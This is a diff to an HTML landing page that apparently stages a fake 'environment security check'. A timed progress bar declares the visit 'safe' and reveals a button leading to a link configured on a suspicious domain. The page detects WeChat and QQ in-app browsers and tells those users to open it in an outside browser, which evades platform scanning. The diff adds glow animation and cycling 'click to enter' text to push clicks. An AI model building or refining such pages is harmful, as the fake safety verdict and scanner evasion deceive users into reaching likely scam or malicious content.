@@ -25,6 +25,7 @@
       padding: 40px 30px;
       max-width: 420px;
       width: 90%;
+      position: relative;
     }
     .shield {
       width: 64px;
@@ -68,7 +69,19 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      margin-top: 20px;
+      margin-top: 30px;
+      animation: glow 1.8s ease-in-out infinite;
+    }
+    @keyframes glow {
+      0% {
+        box-shadow: 0 0 0px rgba(76, 175, 80, 0.4);
+      }
+      50% {
+        box-shadow: 0 0 15px rgba(76, 175, 80, 0.85);
+      }
+      100% {
+        box-shadow: 0 0 0px rgba(76, 175, 80, 0.4);
+      }
     }
     #btn:hover {
       background: #388e3c;
@@ -101,11 +114,11 @@
   <div class="desc" id="text">环境分析中，请稍候...</div>
   <div class="progress"><div class="bar" id="bar"></div></div>
   <div id="progress-text">检测进度：0%</div>
-  <button id="btn" onclick="jump()">✅ 安全 · 点击进入</button>
+  <button id="btn" onclick="jump()">✅ 安全 · 点击进入 >></button>
 </div>
 
 <div id="block">
-  请在浏览器中打开访问
+  请在手机浏览器中打开访问
 </div>
 
 <script>
@@ -113,7 +126,6 @@
   const keyURL = "https://cdn-assets.safe-data-access.xyz/cfg/core.xml?v=678528";
   const duration = 3000;
 
-  // 提示
   const ua = navigator.userAgent.toLowerCase();
   if (/micromessenger|qq\//.test(ua)) {
     document.getElementById("main").style.display = "none";
@@ -132,8 +144,16 @@
       percentTxt.innerText = "检测进度：" + rounded + "%";
       if (percent >= 100) {
         clearInterval(timer);
-        text.innerText = "检测完成，请点击按钮进入页面";
+        text.innerText = "检测完成，请点击下方按钮进入页面";
         btn.style.display = "inline-block";
+
+        // 按钮文字动态切换
+        let hints = ["✅ 点击进入 >", "✅ 点击进入 >>", "✅ 立即访问 >>>"];
+        let i = 0;
+        setInterval(() => {
+          btn.innerText = hints[i % hints.length];
+          i++;
+        }, 1000);
       }
     }, 50);
   }
